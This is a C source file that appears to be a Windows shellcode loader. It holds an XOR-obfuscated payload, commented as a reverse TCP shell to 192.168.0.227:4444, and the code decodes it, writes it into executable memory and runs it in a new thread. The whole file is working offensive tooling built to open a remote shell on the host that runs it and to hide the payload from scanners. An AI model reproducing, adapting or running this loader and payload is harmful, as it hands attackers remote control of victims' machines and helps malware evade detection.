#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
int main(int argc, char* argv[]){
    
    HANDLE hProc = GetCurrentProcess();


    if (hProc == NULL){
        printf("[*] Failed to obtain handle, exiting...");
        return 0;
    }
    printf("[*] Obtained handle: %x\n", hProc);

	unsigned char key[] = "\x69\x42\x55\x12\x89\xc2"; // if payload isnt xor encrypted, set key to \x00
    sleep(1);
	unsigned char shellcode[] = //payload - reverse tcp to 192.168.0.227:4444
		"\x6a\xf5\x15\x59\x66\x55\x56\xbd\x96\xbd\xd7\xec\xd7\xed\xc4\xec\xc0\xf5\xa7\x6f\xf3\xf5\x1d\xef\xf6\xf5\x1d\xef\x8e\xf5\x1d\xef\xb6\xf5\x1d\xcf\xc6\xf5\x99\x0a\xdc\xf7\xdb\x8c\x5f\xf5\xa7\x7d\x3a\x81\xf7\xc1\x94\x91\xb6\xfc\x57\x74\x9b\xfc\x97\x7c\x74\x50\xc4\xfc\xc7\xf5\x1d\xef\xb6\x36\xd4\x81\xde\xbc\x46\x36\x16\x35\x96\xbd\x96\xf5\x13\x7d\xe2\xda\xde\xbc\x46\xed\x1d\xf5\x8e\xf9\x1d\xfd\xb6\xf4\x97\x6d\x75\xeb\xde\x42\x5f\xfc\x1d\x89\x1e\xf5\x97\x6b\xdb\x8c\x5f\xf5\xa7\x7d\x3a\xfc\x57\x74\x9b\xfc\x97\x7c\xae\x5d\xe3\x4c\xda\xbe\xda\x99\x9e\xf8\xaf\x6c\xe3\x65\xce\xf9\x1d\xfd\xb2\xf4\x97\x6d\xf0\xfc\x1d\xb1\xde\xf9\x1d\xfd\x8a\xf4\x97\x6d\xd7\x36\x92\x35\xde\xbc\x46\xfc\xce\xfc\xce\xe3\xcf\xe7\xd7\xe5\xd7\xe4\xd7\xe7\xde\x3e\x7a\x9d\xd7\xef\x69\x5d\xce\xfc\xcf\xe7\xde\x36\x84\x54\xc1\x42\x69\x42\xcb\xf4\x28\xca\xe5\x8f\xc9\x8e\xa4\xbd\x96\xfc\xc0\xf4\x1f\x5b\xde\x3c\x7a\x1d\x97\xbd\x96\xf4\x1f\x58\xdf\x01\x94\xbd\x87\xe1\x56\x15\x96\x5e\xd7\xe9\xdf\x34\x72\xf1\x1f\x4c\xd7\x07\xda\xca\xb0\xba\x69\x68\xda\x34\x7c\xd5\x97\xbc\x96\xbd\xcf\xfc\x2c\x94\x16\xd6\x96\x42\x43\xed\xc6\xf0\xa7\x74\xdb\x8c\x56\xf5\x69\x7d\xde\x34\x54\xf5\x69\x7d\xde\x34\x57\xfc\x2c\x57\x99\x62\x76\x42\x43\xf5\x1f\x7a\xfc\xad\xd7\xe5\xda\x34\x74\xf5\x1f\x44\xd7\x07\x0f\x18\xe2\xdc\x69\x68\xde\x3c\x52\xfd\x94\xbd\x96\xf4\x2e\xde\xfb\xd9\x96\xbd\x96\xbd\x96\xfc\xc6\xfc\xc6\xf5\x1f\x5f\xc1\xea\xc1\xf0\xa7\x7d\xfc\xb0\xcf\xfc\xc6\x5f\x6a\xdb\x51\xf9\xb2\xe9\x97\xbc\xde\x30\xd2\x99\x8e\x7b\x96\xd5\xde\x34\x70\xeb\xc6\xfc\xc6\xfc\xc6\xfc\xc6\xf4\x69\x7d\xd7\xed\xdf\x42\x5e\xf0\x1f\x7c\xda\x34\x57\xfc\x2c\xc4\x5a\x82\x10\x42\x43\xf5\xa7\x6f\xde\x42\x5c\x36\x98\xfc\x2c\xb5\x11\xa0\xf6\x42\x43\x06\x76\xa0\xbc\xb7\xd7\x07\x30\x28\x2b\x20\x69\x68\xde\x3e\x52\x95\xaa\xbb\xea\xb7\x16\x46\x76\xc8\x93\x06\xd1\xae\xe4\xd2\xfc\xbd\xcf\xfc\x1f\x67\x69\x68";
	int shellcodesize=460;

    sleep(1);
    for (int i = 0; i < shellcodesize; i++){
		shellcode[i]=shellcode[i]^0xff;
	}
    sleep(1);
	for (int i = 0; i < shellcodesize; i++){
		shellcode[i]=shellcode[i]^key[i%2];
	}
    



    LPVOID addr_pointer = VirtualAllocEx( // allocate the needed memory
		hProc,
		NULL,
		shellcodesize,
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_EXECUTE_READWRITE
	);

	printf("[*] Pointer to allocated memory: %x\n", addr_pointer);

    //sleep(1);

	bool res = WriteProcessMemory(
		hProc,
		addr_pointer,
		shellcode,
		shellcodesize,
		NULL
	);
	if (res==0){
		printf("something got fucked, exiting...");
		return 0;
	}
	printf("[*] Memory allocated succesfully\n");

    //sleep(1);

	HANDLE hThread = CreateThread(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE) addr_pointer,
		NULL,
		0,
		NULL
	);

    WaitForSingleObject(hThread, INFINITE);



	printf("[*] Shellcode injected, exiting...");



    return 0;

}

